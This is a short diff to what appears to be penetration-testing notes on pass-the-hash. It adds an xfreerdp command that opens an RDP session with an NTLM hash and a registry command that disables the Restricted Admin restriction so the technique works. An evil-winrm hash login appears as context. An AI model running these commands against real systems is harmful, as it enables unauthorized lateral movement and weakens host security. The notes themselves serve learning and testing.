@@ -44,4 +44,12 @@ evil-winrm -i <ip> -u <username> -H <hash>
 ```
 
 -Passing the hash with RDP:
-By using xfreerdp, we can use PTH technique and 
+By using xfreerdp, we can use PTH technique to gain a RDP session:
+```
+xfreerdp /v:<ip> /u:<username> /pth:<hash>
+```
+
+Note: Sometimes, we may need to first enable restricted admin mode before we can gain a remote RDP session, we can enable restricted admin mode by running the below:
+```
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
